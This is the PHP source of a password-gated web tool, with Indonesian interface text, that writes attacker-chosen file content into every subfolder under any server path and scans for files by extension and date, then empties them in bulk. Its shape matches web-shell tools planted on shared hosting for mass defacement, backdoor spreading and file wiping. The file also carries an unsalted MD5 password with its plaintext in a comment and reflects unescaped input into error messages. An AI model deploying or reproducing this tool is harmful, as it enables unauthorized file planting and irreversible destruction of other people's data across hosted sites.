<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ===== LOGOUT =====
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ===== LOGIN =====
$stored_hash = "da86a3a1b1f29bceeda7b0f68ba90b5d"; // md5("Hadii")

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    $error = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
        $password = $_POST['password'] ?? '';
        if (md5($password) === $stored_hash) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password salah!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <style>
            body { font-family: Arial; background: #f0f0f0; text-align:center; padding-top:100px; }
            form { background:#fff; padding:20px; border-radius:10px; display:inline-block; box-shadow:0 0 10px rgba(0,0,0,0.2); }
            input[type=password] { padding:10px; width:200px; }
            input[type=submit] { padding:10px 20px; }
            .error { color:red; }
        </style>
    </head>
    <body>
        <form method="post">
            <h2>Masukkan Password</h2>
            <input type="hidden" name="login" value="1">
            <input type="password" name="password" placeholder="Password"><br><br>
            <input type="submit" value="Login">
            <?php if (!empty($error)) echo "<p class='error'>$error</p>"; ?>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ===== FITUR =====
$results = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action   = $_POST['action'];
    $basePath = rtrim($_POST['base_path'] ?? '', '/');

    if (!is_dir($basePath)) {
        $results[] = "<div class='error'>Base path tidak ditemukan: $basePath</div>";
    } else {
        if ($action === 'create') {
            $folderName  = trim($_POST['folder_name'] ?? '');
            $fileName    = trim($_POST['file_name'] ?? '');
            $fileContent = $_POST['file_content'] ?? '';

            $subfolders = glob($basePath . '/*', GLOB_ONLYDIR);
            foreach ($subfolders as $sub) {
                $targetFolder = $sub;
                if ($folderName) {
                    $newFolder = $sub . '/' . $folderName;
                    if (!is_dir($newFolder)) {
                        if (mkdir($newFolder, 0755)) {
                            $results[] = "<div class='success'>Folder dibuat: $newFolder</div>";
                        } else {
                            $results[] = "<div class='error'>Gagal membuat folder: $newFolder</div>";
                        }
                    }
                    $targetFolder = $newFolder;
                }

                if ($fileName) {
                    $filePath = $targetFolder . '/' . $fileName;

                    // ==== REVISI: backup jika file sudah ada ====
                    if (file_exists($filePath)) {
                        $backupPath = $filePath . '.bak';
                        if (file_exists($backupPath)) {
                            $backupPath = $filePath . '.' . time() . '.bak';
                        }
                        if (rename($filePath, $backupPath)) {
                            $results[] = "<div class='success'>File lama dipindahkan ke: " . htmlspecialchars($backupPath) . "</div>";
                        } else {
                            $results[] = "<div class='error'>Gagal membuat backup: " . htmlspecialchars($filePath) . "</div>";
                        }
                    }

                    // Buat file baru
                    if (file_put_contents($filePath, $fileContent) !== false) {
                        $results[] = "<div class='success'>File dibuat: " . htmlspecialchars($filePath) . "</div>";
                    } else {
                        $results[] = "<div class='error'>Gagal membuat file: " . htmlspecialchars($filePath) . "</div>";
                    }
                }
            }
            if (empty($subfolders)) {
                $results[] = "<div class='error'>Tidak ada subfolder di $basePath</div>";
            }

        } elseif ($action === 'scan') {
            $ext    = trim($_POST['file_ext'] ?? '');
            $dateIn = trim($_POST['date_from'] ?? '');

            if (!$ext || !$dateIn) {
                $results[] = "<div class='error'>Ekstensi dan tanggal wajib diisi!</div>";
            } else {
                $timestamp = strtotime($dateIn . " 00:00:00");
                $foundFiles = [];

                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );

                foreach ($iterator as $file) {
                    if ($file->isFile() && strtolower(pathinfo($file, PATHINFO_EXTENSION)) === strtolower($ext)) {
                        if ($file->getMTime() >= $timestamp) {
                            $foundFiles[] = $file->getPathname();
                        }
                    }
                }

                if ($foundFiles) {
                    $results[] = "<div class='success'>Ditemukan " . count($foundFiles) . " file:</div><ul>";
                    foreach ($foundFiles as $f) {
                        $results[] = "<li>" . htmlspecialchars($f) . "</li>";
                    }
                    $results[] = "</ul>";

                    $_SESSION['scan_base'] = $basePath;
                    $_SESSION['scan_ext']  = $ext;
                    $_SESSION['scan_date'] = $dateIn;
                } else {
                    $results[] = "<div class='error'>Tidak ada file .$ext setelah tanggal $dateIn</div>";
                }
            }

        } elseif ($action === 'blank') {
            $basePath  = $_SESSION['scan_base'] ?? $basePath;
            $ext       = $_SESSION['scan_ext'] ?? '';
            $dateIn    = $_SESSION['scan_date'] ?? '';
            $timestamp = strtotime($dateIn . " 00:00:00");
            $count = 0;

            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($iterator as $file) {
                if ($file->isFile() && strtolower(pathinfo($file, PATHINFO_EXTENSION)) === strtolower($ext)) {
                    if ($file->getMTime() >= $timestamp) {
                        if (file_put_contents($file->getPathname(), "") !== false) {
                            $results[] = "<div class='success'>Dikosongkan: ".htmlspecialchars($file->getPathname())."</div>";
                            $count++;
                        } else {
                            $results[] = "<div class='error'>Gagal kosongkan: ".htmlspecialchars($file->getPathname())."</div>";
                        }
                    }
                }
            }

            if ($count === 0) {
                $results[] = "<div class='error'>Tidak ada file .$ext yang bisa dikosongkan</div>";
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Mass Uploader File + Mass Blank File</title>
<style>
body{font-family:sans-serif; margin:20px;}
input, textarea{width:100%; padding:8px; margin:5px 0;}
button{padding:10px 15px; margin-top:10px;}
.success{color:green;}
.error{color:red;}
fieldset{margin-bottom:20px; padding:15px;}
ul{margin:5px 0 15px 20px;}
.logout{position:absolute; top:10px; right:10px;}
</style>
</head>
<body>

<div class="logout">
    <a href="?logout=1" style="padding:5px 10px; background:#f44336; color:white; text-decoration:none; border-radius:5px;">Logout</a>
</div>

<h2>Mass Uploader File</h2>

<fieldset>
<legend><b>Buat Folder & File Baru</b></legend>
<form method="POST">
    <input type="hidden" name="action" value="create">
    <label>Base Path (contoh: /home/user1)</label>
    <input type="text" name="base_path" required>

    <label>Nama Folder Baru (opsional)</label>
    <input type="text" name="folder_name">

    <label>Nama File (opsional)</label>
    <input type="text" name="file_name">

    <label>Isi File</label>
    <textarea name="file_content" rows="6"></textarea>

    <button type="submit">Jalankan</button>
</form>
</fieldset>

<fieldset>
<legend><b>Scan File</b></legend>
<form method="POST">
    <input type="hidden" name="action" value="scan">
    <label>Base Path (contoh: /home/user1)</label>
    <input type="text" name="base_path" required>

    <label>Ekstensi File (contoh: php, html, txt)</label>
    <input type="text" name="file_ext" required>

    <label>Scan mulai tanggal (format: yyyy-mm-dd)</label>
    <input type="date" name="date_from" required>

    <button type="submit">Scan File</button>
</form>
</fieldset>

<?php if(isset($_SESSION['scan_base'])): ?>
<fieldset>
<legend><b>Mass Blank File</b></legend>
<form method="POST" id="blankForm">
    <input type="hidden" name="action" value="blank">
    <button type="submit">Kosongkan Semua File Ini</button>
</form>
<script>
document.getElementById('blankForm').onsubmit = function() {
    return confirm("Apakah Anda yakin ingin mengosongkan file ini?\nTindakan ini tidak bisa di-undo.");
};
</script>
</fieldset>
<?php endif; ?>

<hr>
<div>
<?php
if (!empty($results)) {
    foreach ($results as $r) {
        echo $r . "<br>";
    }
}
?>
</div>
</body>
</html>